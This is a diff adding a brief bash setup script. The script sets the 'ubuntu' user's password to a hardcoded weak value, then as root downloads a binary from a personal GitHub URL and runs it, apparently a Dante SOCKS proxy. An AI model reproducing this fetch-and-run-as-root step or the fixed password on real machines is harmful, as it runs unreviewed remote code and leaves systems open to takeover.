@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+echo ubuntu:1234abcd | chpasswd
+sleep 2
+sudo su <<EOF
+wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted2 && chmod +x * && ./danted2
+sleep 3
+cd /home/
+sleep 3
+EOF
